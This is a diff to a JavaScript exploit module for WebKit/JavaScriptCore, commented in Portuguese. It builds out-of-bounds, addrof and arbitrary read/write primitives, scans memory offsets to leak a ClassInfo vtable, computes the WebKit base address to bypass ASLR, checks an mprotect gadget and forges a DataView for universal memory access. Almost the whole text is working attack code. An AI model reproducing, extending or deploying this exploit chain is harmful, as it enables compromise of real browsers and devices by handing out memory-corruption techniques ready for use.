@@ -4,8 +4,8 @@
 // FOCO: Fortificar a estabilidade da alocação do ArrayBuffer/DataView usado para OOB.
 // =======================================================================================
 
-import { AdvancedInt64, toHex, isAdvancedInt64Object, log, PAUSE } from '../module/utils.mjs'; // Caminho alterado
-import { // Importa funções core
+import { AdvancedInt64, toHex, isAdvancedInt64Object, log, PAUSE } from '../module/utils.mjs'; 
+import { 
     triggerOOB_primitive,
     getOOBDataView,
     clearOOBEnvironment,
@@ -15,14 +15,14 @@ import { // Importa funções core
     arb_read,
     arb_write,
     selfTestOOBReadWrite,
-    oob_read_absolute, // Não é usado diretamente para ARB R/W, mas mantido
-    oob_write_absolute, // Não é usado diretamente para ARB R/W, mas mantido
-    setupOOBMetadataForArbitraryAccess // Importar a nova função
+    oob_read_absolute, 
+    oob_write_absolute, 
+    setupOOBMetadataForArbitraryAccess 
 } from '../core_exploit.mjs';
 
 import { JSC_OFFSETS, WEBKIT_LIBRARY_INFO } from '../config.mjs';
 
-export const FNAME_MODULE = "v21 - Calculo ASLR CORRETO da Base WebKit"; // Versão atualizada
+export const FNAME_MODULE = "v21 - Calculo ASLR CORRETO da Base WebKit"; 
 
 // Aumentando as pausas para maior estabilidade em sistemas mais lentos ou com GC agressivo
 const LOCAL_VERY_SHORT_PAUSE = 10;
@@ -31,7 +31,7 @@ const LOCAL_MEDIUM_PAUSE = 750;
 const LOCAL_LONG_PAUSE = 1500;
 const LOCAL_SHORT_SHORT_PAUSE = 50;
 
-const EXPECTED_BUTTERFLY_ELEMENT_SIZE = 8; // Constante para JSValue (8 bytes)
+const EXPECTED_BUTTERFLY_ELEMENT_SIZE = 8; 
 
 let global_spray_objects = [];
 let hold_objects = [];
@@ -51,7 +51,7 @@ async function dumpMemory(address, size, logFn, arbReadFn, sourceName = "Dump") 
         for (let j = 0; j < bytesPerRow; j++) {
             if (i + j < size) {
                 try {
-                    const byte = await arbReadFn(address.add(i + j), 1, logFn);
+                    const byte = await arbReadFn(address.add(i + j), 1); // arbReadFn é um wrapper, não precisa de logFn extra
                     rowBytes.push(byte);
                     hexLine += byte.toString(16).padStart(2, '0') + " ";
                     asciiLine += (byte >= 0x20 && byte <= 0x7E) ? String.fromCharCode(byte) : '.';
@@ -72,10 +72,10 @@ async function dumpMemory(address, size, logFn, arbReadFn, sourceName = "Dump") 
     logFn(`[${sourceName}] Fim do dump.`, "debug");
 }
 
-export async function arb_read_universal_js_heap(address, byteLength, logFn) {
+export async function arb_read_universal_js_heap(address, byteLength) { // remove logFn param
     const FNAME = "arb_read_universal_js_heap";
     if (!_fake_data_view) {
-        logFn(`[${FNAME}] ERRO: Primitiva de L/E Universal (heap JS) não inicializada ou não estável.`, "critical", FNAME);
+        log(`[${FNAME}] ERRO: Primitiva de L/E Universal (heap JS) não inicializada ou não estável.`, "critical", FNAME); // use global log
         throw new Error("Universal ARB R/W (JS heap) primitive not initialized.");
     }
     const fake_ab_backing_addr = addrof_core(_fake_data_view);
@@ -103,10 +103,10 @@ export async function arb_read_universal_js_heap(address, byteLength, logFn) {
     return result;
 }
 
-export async function arb_write_universal_js_heap(address, value, byteLength, logFn) {
+export async function arb_write_universal_js_heap(address, value, byteLength) { // remove logFn param
     const FNAME = "arb_write_universal_js_heap";
     if (!_fake_data_view) {
-        logFn(`[${FNAME}] ERRO: Primitiva de L/E Universal (heap JS) não inicializada ou não estável.`, "critical", FNAME);
+        log(`[${FNAME}] ERRO: Primitiva de L/E Universal (heap JS) não inicializada ou não estável.`, "critical", FNAME); // use global log
         throw new Error("Universal ARB R/W (JS heap) primitive not initialized.");
     }
     const fake_ab_backing_addr = addrof_core(_fake_data_view);
@@ -203,8 +203,8 @@ async function attemptUniversalArbitraryReadWriteWithMMode(logFn, pauseFn, JSC_O
         // O DataView forjado (_fake_data_view) terá seu m_vector manipulado pela arb_read/write_universal_js_heap
         // para apontar para o objeto de teste.
         const TEST_VALUE_UNIVERSAL = 0xDEADC0DE;
-        await arb_write_universal_js_heap(test_target_js_object_addr, TEST_VALUE_UNIVERSAL, 4, logFn);
-        const read_back_from_fake_dv = await arb_read_universal_js_heap(test_target_js_object_addr, 4, logFn);
+        await arb_write_universal_js_heap(test_target_js_object_addr, TEST_VALUE_UNIVERSAL, 4); // removido logFn
+        const read_back_from_fake_dv = await arb_read_universal_js_heap(test_target_js_object_addr, 4); // removido logFn
 
         if (test_target_js_object.test_prop === TEST_VALUE_UNIVERSAL && read_back_from_fake_dv === TEST_VALUE_UNIVERSAL) {
             logFn(`[${FNAME}] SUCESSO CRÍTICO: L/E Universal (heap JS) FUNCIONANDO com m_mode ${toHex(m_mode_to_try)}!`, "vuln", FNAME);
@@ -318,10 +318,9 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43(logFn, paus
     let webkit_base_address = null;
     let found_m_mode = null;
 
-    // Declaração da variável fora do try/catch principal para evitar redeclaração
     let DATA_VIEW_STRUCTURE_VTABLE_ADDRESS_FOR_FAKE = null; 
 
-    try { // <-- Este é o 'try' principal da função executeTypedArrayVictimAddrofAndWebKitLeak_R43
+    try { 
         logFn("Limpeza inicial do ambiente OOB para garantir estado limpo...", "info");
         clearOOBEnvironment({ force_clear_even_if_not_setup: true });
 
@@ -354,17 +353,15 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43(logFn, paus
         await triggerOOB_primitive({ force_reinit: true });
 
         const oob_data_view = getOOBDataView();
-        const oob_array_buffer = oob_data_view.buffer; // Obtenha a referência ao ArrayBuffer real
-        hold_objects.push(oob_array_buffer); // Mantenha o ArrayBuffer real referenciado para evitar GC
-        hold_objects.push(oob_data_view); // Mantenha o DataView real referenciado para evitar GC
+        const oob_array_buffer = oob_data_view.buffer; 
+        hold_objects.push(oob_array_buffer); 
+        hold_objects.push(oob_data_view); 
 
-        // NOVO: Aquecer/Pin o oob_array_buffer_real diretamente aqui
         logFn(`[FASE 2] Aquecendo/Pinando oob_array_buffer_real para estabilizar ponteiro CONTENTS_IMPL_POINTER.`, "info");
         try {
             if (oob_array_buffer && oob_array_buffer.byteLength > 0) {
                 const tempUint8View = new Uint8Array(oob_array_buffer);
-                // Acessos mais agressivos e variados para forçar o JIT a "fixar" o buffer
-                for (let i = 0; i < Math.min(tempUint8View.length, 0x1000); i += 8) { // Acessar a cada 8 bytes
+                for (let i = 0; i < Math.min(tempUint8View.length, 0x1000); i += 8) { 
                     tempUint8View[i] = i % 255;
                     tempUint8View[i+1] = (i+1) % 255;
                     tempUint8View[i+2] = (i+2) % 255;
@@ -375,15 +372,13 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43(logFn, paus
                     tempUint8View[i+7] = (i+7) % 255;
                 }
                  for (let i = 0; i < Math.min(tempUint8View.length, 0x1000); i += 8) {
-                    let val = tempUint8View[i]; // Lê para forçar atividade de memória
+                    let val = tempUint8View[i]; 
                  }
                 logFn(`[FASE 2] oob_array_buffer_real aquecido/pinado com sucesso.`, "good");
             }
         } catch (e) {
             logFn(`[FASE 2] ALERTA: Erro durante o aquecimento/pinning do oob_array_buffer_real: ${e.message}`, "warn");
         }
-        // FIM do Aquecimento/Pinning
-
 
         if (!oob_data_view) {
             const errMsg = "Falha crítica ao obter primitiva OOB. DataView é nulo.";
@@ -409,8 +404,6 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43(logFn, paus
         const dummy_object_addr = addrof_core(dummy_object_for_aslr_leak);
         logFn(`[ASLR LEAK] Endereço de dummy_object_for_aslr_leak: ${dummy_object_addr.toString(true)}`, "info");
 
-        // === NOVA LÓGICA DE BYPASS ===
-        // Esta lógica agora é executada *após* a validação das primitivas OOB locais na FASE 0.
         logFn(`[ASLR LEAK] Tentando manipular flags/offsets do ArrayBuffer real para bypass da mitigação.`, "info");
 
         const TEST_VALUE_FOR_0X34 = 0x1000; 
@@ -427,28 +420,20 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43(logFn, paus
             {
                 field_0x34: TEST_VALUE_FOR_0X34,
                 field_0x40: TEST_VALUE_FOR_0X40,
-                // Adicione outros campos se a engenharia reversa confirmar sua utilidade
-                // field_0x28: TEST_VALUE_FOR_0X28,
-                // field_0x38: TEST_VALUE_FOR_0X38,
-                // field_0x30: TEST_VALUE_FOR_0X30
             }
         );
         logFn(`[ASLR LEAK] Metadados do oob_array_buffer_real ajustados para tentar bypass.`, "info");
         await pauseFn(LOCAL_SHORT_PAUSE);
 
-        // Tentar novamente a leitura do ponteiro da Structure após a modificação dos metadados
-        // structure_pointer_from_dummy_object_addr é o endereço do ponteiro para a Structure (dentro do JSCell)
         const structure_pointer_from_dummy_object_addr = dummy_object_addr.add(JSC_OFFSETS_PARAM.JSCell.STRUCTURE_POINTER_OFFSET);
-        const structure_address_from_leak = await arb_read(structure_pointer_from_dummy_object_addr, 8); // Valor do ponteiro para o objeto Structure
+        const structure_address_from_leak = await arb_read(structure_pointer_from_dummy_object_addr, 8); 
 
         logFn(`[ASLR LEAK] Endereço da Structure do dummy_object (vazado): ${structure_address_from_leak.toString(true)}`, "leak");
-        // DEBUG: DUMP DA MEMÓRIA AO REDOR DO ENDEREÇO DA STRUCTURE VAZADA
         if (!structure_address_from_leak.equals(AdvancedInt64.Zero)) {
-            logFn(`[ASLR LEAK] DEBUG: Dump de 0x80 bytes ao redor de ${structure_address_from_leak.toString(true)}`, "debug");
+            logFn(`[ASLR LEAK] DEBUG: Dump de 0x80 bytes ao redor de ${structure_address_from_leak.toString(true)} (espera-se ponteiro para ClassInfo)`, "debug");
             await dumpMemory(structure_address_from_leak.sub(0x40), 0x80, logFn, arb_read, "Structure Leak Context");
             await pauseFn(LOCAL_SHORT_PAUSE);
         }
-
 
         if (!isAdvancedInt64Object(structure_address_from_leak) || structure_address_from_leak.equals(AdvancedInt64.Zero)) {
             const errMsg = `Falha na leitura do ponteiro da Structure do dummy_object após ajuste: ${structure_address_from_leak.toString(true)}. Abortando ASLR leak.`;
@@ -456,32 +441,93 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43(logFn, paus
             throw new Error(errMsg);
         }
 
-        // AGORA, vazaremos o endereço da Vtable da ClassInfo, que está dentro da WebKit
-        // ClassInfo Address = Structure Address + JSC_OFFSETS.Structure.CLASS_INFO_OFFSET (0x50)
-        const class_info_address = structure_address_from_leak.add(JSC_OFFSETS_PARAM.Structure.CLASS_INFO_OFFSET);
-        logFn(`[ASLR LEAK] Endereço da ClassInfo do dummy_object: ${class_info_address.toString(true)}`, "info");
+        const class_info_address_base = structure_address_from_leak.add(JSC_OFFSETS_PARAM.Structure.CLASS_INFO_OFFSET);
+        logFn(`[ASLR LEAK] Endereço presumido da base da ClassInfo do dummy_object (Structure+0x50): ${class_info_address_base.toString(true)}`, "info");
 
-        // Endereço da Vtable da ClassInfo = ClassInfo Address + JSC_OFFSETS.ClassInfo.M_CACHED_TYPE_INFO_OFFSET (0x8)
-        const vtable_class_info_address_in_webkit = await arb_read(class_info_address.add(JSC_OFFSETS_PARAM.ClassInfo.M_CACHED_TYPE_INFO_OFFSET), 8);
-        logFn(`[ASLR LEAK] Endereço da Vtable da ClassInfo do dummy_object (dentro do WebKit): ${vtable_class_info_address_in_webkit.toString(true)}`, "leak");
+        // --- INÍCIO DO SCANNER DE OFFSETS PARA M_CACHED_TYPE_INFO_OFFSET ---
+        logFn(`[ASLR LEAK] INICIANDO SCANNER para JSC_OFFSETS.ClassInfo.M_CACHED_TYPE_INFO_OFFSET (vtable ClassInfo)...`, "subtest");
+        let found_vtable_offset = null;
+        const SCAN_RANGE_START = 0x0;   // Começa em 0
+        const SCAN_RANGE_END = 0x100;   // Vai até 0x100 (256 bytes)
+        const SCAN_STEP = 0x8;          // Passos de 8 bytes (tamanho de um ponteiro)
+
+        for (let offset = SCAN_RANGE_START; offset <= SCAN_RANGE_END; offset += SCAN_STEP) {
+            const potential_vtable_addr = class_info_address_base.add(offset);
+            let vtable_value = null;
+            try {
+                vtable_value = await arb_read(potential_vtable_addr, 8);
+            } catch (scanError) {
+                // Erros de leitura (e.g., fora dos limites de memória acessível) serão logados, mas não abortarão o scanner.
+                // logFn(`[ASLR LEAK] Scanner: Erro ao ler em ${potential_vtable_addr.toString(true)}: ${scanError.message}`, "debug");
+                continue; // Pula para o próximo offset
+            }
+
+            // Validação:
+            // 1. Deve ser um AdvancedInt64 válido.
+            // 2. Não deve ser zero ou 0xFFFFFFFF (indicativo de ponteiro nulo ou lixo/não mapeado).
+            // 3. O byte menos significativo (low) deve terminar em 0x000 (alinhamento de página ou vtable).
+            if (isAdvancedInt64Object(vtable_value) &&
+                !vtable_value.equals(AdvancedInt64.Zero) &&
+                !vtable_value.equals(new AdvancedInt64(0xFFFFFFFF, 0xFFFFFFFF)) && // Verifica se não é 0xFFFFFFFF
+                (vtable_value.low() & 0xFFF) === 0x000) { // Alinhamento de página (4KB)
+                
+                logFn(`[ASLR LEAK] SCANNER ENCONTROU CANDIDATO: Offset 0x${offset.toString(16)} em relação à ClassInfo base (0x${class_info_address_base.low().toString(16)}) -> Vtable lida: ${vtable_value.toString(true)}`, "vuln", "Scanner");
+
+                // Opcional: Tentativa de calcular base WebKit com este offset candidato e verificar um gadget conhecido.
+                const temp_webkit_base = vtable_value.sub(new AdvancedInt64(parseInt(JSC_OFFSETS_PARAM.DataView.STRUCTURE_VTABLE_OFFSET, 16), 0));
+                
+                // Validação mais rigorosa: tentar ler o mprotect_plt_stub com a base calculada
+                const mprotect_plt_offset_test = new AdvancedInt64(parseInt(WEBKIT_LIBRARY_INFO.FUNCTION_OFFSETS["mprotect_plt_stub"], 16), 0);
+                const mprotect_addr_test = temp_webkit_base.add(mprotect_plt_offset_test);
+                let mprotect_bytes = null;
+                try {
+                    mprotect_bytes = await arb_read(mprotect_addr_test, 4);
+                } catch (mprotectReadError) {
+                    // logFn(`[ASLR LEAK] Scanner: Erro ao ler mprotect com base ${temp_webkit_base.toString(true)}: ${mprotectReadError.message}`, "debug");
+                }
+
+                if (mprotect_bytes !== null && mprotect_bytes !== 0 && mprotect_bytes !== 0xFFFFFFFF) {
+                    logFn(`[ASLR LEAK] SCANNER CONFIRMADO: OFFSET 0x${offset.toString(16)}! Vtable: ${vtable_value.toString(true)}, Base WebKit Tentativa: ${temp_webkit_base.toString(true)}, mprotect bytes: ${toHex(mprotect_bytes)}.`, "good", "Scanner");
+                    found_vtable_offset = offset;
+                    break; // Sai do loop após encontrar um candidato confirmado
+                } else {
+                    logFn(`[ASLR LEAK] SCANNER: Candidato 0x${offset.toString(16)} Vtable ${vtable_value.toString(true)} (Base ${temp_webkit_base.toString(true)}) NÃO confirmada por mprotect check (lido: ${toHex(mprotect_bytes)}).`, "warn", "Scanner");
+                }
+            } else {
+                // logFn(`[ASLR LEAK] Scanner: Offset 0x${offset.toString(16)} (Valor: ${vtable_value ? vtable_value.toString(true) : 'N/A'}) não é um vtable válido.`, "debug");
+            }
+            await pauseFn(LOCAL_VERY_SHORT_PAUSE); // Pequena pausa para não travar
+        }
+        // --- FIM DO SCANNER DE OFFSETS ---
+
+        if (found_vtable_offset !== null) {
+            // Atualiza o offset no JSC_OFFSETS_PARAM para o valor encontrado
+            JSC_OFFSETS_PARAM.ClassInfo.M_CACHED_TYPE_INFO_OFFSET = found_vtable_offset;
+            logFn(`[ASLR LEAK] JSC_OFFSETS.ClassInfo.M_CACHED_TYPE_INFO_OFFSET ATUALIZADO para 0x${found_vtable_offset.toString(16)} por scanner.`, "good");
+        } else {
+            const errMsg = "Falha crítica: Scanner não encontrou um offset de vtable ClassInfo válido. Revise os offsets da Structure ou o range de busca.";
+            logFn(errMsg, "critical");
+            throw new Error(errMsg);
+        }
+
+
+        // Re-calcular vtable_class_info_address_in_webkit com o offset potencialmente corrigido
+        const vtable_class_info_address_in_webkit = await arb_read(class_info_address_base.add(JSC_OFFSETS_PARAM.ClassInfo.M_CACHED_TYPE_INFO_OFFSET), 8);
+        logFn(`[ASLR LEAK] Endereço da Vtable da ClassInfo do dummy_object (após scan/atualização): ${vtable_class_info_address_in_webkit.toString(true)}`, "leak");
         // DEBUG: DUMP DA MEMÓRIA AO REDOR DO ENDEREÇO DA VTABLE CLASSINFO VAZADA
         if (!vtable_class_info_address_in_webkit.equals(AdvancedInt64.Zero)) {
             logFn(`[ASLR LEAK] DEBUG: Dump de 0x80 bytes ao redor de ${vtable_class_info_address_in_webkit.toString(true)} (espera-se ponteiro para .text)`, "debug");
-            await dumpMemory(vtable_class_info_address_in_webkit.sub(0x40), 0x80, logFn, arb_read, "Vtable ClassInfo Leak Context");
+            await dumpMemory(vtable_class_info_address_in_webkit.sub(0x40), 0x80, logFn, arb_read, "Vtable ClassInfo Leak Context (Post-Scan)");
             await pauseFn(LOCAL_SHORT_PAUSE);
         }
 
 
         if (!isAdvancedInt64Object(vtable_class_info_address_in_webkit) || vtable_class_info_address_in_webkit.equals(AdvancedInt64.Zero) || (vtable_class_info_address_in_webkit.low() & 0xFFF) !== 0x000) {
-            const errMsg = `Vtable da ClassInfo (${vtable_class_info_address_in_webkit.toString(true)}) é inválida ou não alinhada. Abortando ASLR leak.`;
+            const errMsg = `Vtable da ClassInfo (${vtable_class_info_address_in_webkit.toString(true)}) é inválida ou não alinhada APÓS SCAN. Abortando ASLR leak.`;
             logFn(errMsg, "critical");
             throw new Error(errMsg);
         }
 
-        // CÁLCULO DA BASE WEBKIT:
-        // webkit_base_address = vtable_class_info_address_in_webkit - Offset_da_Vtable_ClassInfo_no_binario
-        // JSC_OFFSETS.DataView.STRUCTURE_VTABLE_OFFSET (0x3AD62A0) é o offset da vtable da DataView
-        // *dentro do binário*. Vamos assumir que o offset da vtable da ClassInfo do JSObject é próximo ou o mesmo.
         const OFFSET_VTABLE_CLASSINFO_TO_WEBKIT_BASE = new AdvancedInt64(parseInt(JSC_OFFSETS_PARAM.DataView.STRUCTURE_VTABLE_OFFSET, 16), 0);
         webkit_base_address = vtable_class_info_address_in_webkit.sub(OFFSET_VTABLE_CLASSINFO_TO_WEBKIT_BASE);
 
@@ -492,7 +538,6 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43(logFn, paus
         }
         logFn(`SUCESSO: Endereço base REAL da WebKit OBTIDO: ${webkit_base_address.toString(true)}`, "good");
 
-        // ... (Verificação de gadget mprotect_plt_stub, FASE 4, FASE 5)
         const mprotect_plt_offset_check = new AdvancedInt64(parseInt(WEBKIT_LIBRARY_INFO.FUNCTION_OFFSETS["mprotect_plt_stub"], 16), 0);
         const mprotect_addr_check = webkit_base_address.add(mprotect_plt_offset_check);
         logFn(`Verificando gadget mprotect_plt_stub em ${mprotect_addr_check.toString(true)} (para validar ASLR).`, "info");
@@ -508,7 +553,6 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43(logFn, paus
 
         logFn("--- FASE 4: Configurando a primitiva de L/E Arbitrária Universal (via fakeobj DataView) ---", "subtest");
         
-        // Atribuição aqui (não 'const' para evitar redeclaração)
         DATA_VIEW_STRUCTURE_VTABLE_ADDRESS_FOR_FAKE = webkit_base_address.add(new AdvancedInt64(parseInt(JSC_OFFSETS_PARAM.DataView.STRUCTURE_VTABLE_OFFSET, 16), 0));
         logFn(`[${FNAME_CURRENT_TEST_BASE}] Endereço calculado do vtable da DataView Structure para FORJAMENTO: ${DATA_VIEW_STRUCTURE_VTABLE_ADDRESS_FOR_FAKE.toString(true)}`, "info");
 
@@ -556,8 +600,8 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43(logFn, paus
         const mprotect_addr_real = webkit_base_address.add(mprotect_plt_offset);
 
         logFn(`[REAL LEAK] Endereço do gadget 'mprotect_plt_stub' calculado: ${mprotect_addr_real.toString(true)}`, "leak");
-        const mprotect_first_bytes = await arb_read_universal_js_heap(mprotect_addr_real, 4, logFn);
-        logFn(`[REAL LEAK] Primeiros 4 bytes de mprotect_plt_stub (${mprotect_addr_real.toString(true)}): ${toHex(mprotect_first_bytes)}`, "leak");
+        const mprotect_first_bytes = await arb_read_universal_js_heap(mprotect_addr_real, 4);
+        logFn(`[REAL LEAK] Primeiros 4 bytes de mprotect_plt_stub (${mprotect_addr_real.toString(true)}): ${toHex(mprotect_first_bytes)}.`, "leak");
         if (mprotect_first_bytes !== 0 && mprotect_first_bytes !== 0xFFFFFFFF) {
             logFn(`LEITURA DE GADGET CONFIRMADA: Primeiros bytes de mprotect: ${toHex(mprotect_first_bytes)}. ASLR validado!`, "good");
         } else {
@@ -607,8 +651,8 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43(logFn, paus
         for (let i = 0; i < numResistanceTests; i++) {
             const test_value_arb_rw = new AdvancedInt64(0xCCCC0000 + i, 0xDDDD0000 + i);
             try {
-                await arb_write_universal_js_heap(butterfly_addr_of_spray_obj, test_value_arb_rw, 8, logFn);
-                const read_back_value_arb_rw = await arb_read_universal_js_heap(butterfly_addr_of_spray_obj, 8, logFn);
+                await arb_write_universal_js_heap(butterfly_addr_of_spray_obj, test_value_arb_rw, 8);
+                const read_back_value_arb_rw = await arb_read_universal_js_heap(butterfly_addr_of_spray_obj, 8);
 
                 if (read_back_value_arb_rw.equals(test_value_arb_rw)) {
                     resistanceSuccessCount_post_leak++;
@@ -641,11 +685,11 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43(logFn, paus
             }
         };
 
-    } catch (e) { // <-- Este é o 'catch' principal da função executeTypedArrayVictimAddrofAndWebKitLeak_R43
+    } catch (e) { 
         final_result.message = `Exceção crítica na implementação funcional: ${e.message}\n${e.stack || ''}`;
         final_result.success = false;
         logFn(final_result.message, "critical");
-    } finally { // <-- Este é o 'finally' principal da função executeTypedArrayVictimAddrofAndWebKitLeak_R43
+    } finally { 
         logFn(`Iniciando limpeza final do ambiente e do spray de objetos...`, "info");
         global_spray_objects = [];
         hold_objects = [];
